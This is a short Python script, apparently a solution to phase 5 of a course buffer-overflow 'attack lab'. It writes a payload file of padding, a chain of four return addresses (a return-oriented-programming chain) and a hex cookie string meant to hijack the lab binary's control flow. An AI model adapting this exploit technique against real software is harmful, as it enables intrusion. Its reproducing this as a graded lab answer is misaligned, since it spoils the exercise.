import struct

cookie = 0x3E52DFF5

with open("phase5_payload.bin", "wb") as f:
    f.write(b"A" * 0x18)
    f.write(struct.pack("<q", 0x401A44))
    f.write(struct.pack("<q", 0x401A18))
    f.write(struct.pack("<q", 0x4019F8))
    f.write(struct.pack("<q", 0x40194D))
    f.write(b"A" * 31 + f"{cookie:8x}".encode() + b"\x00")
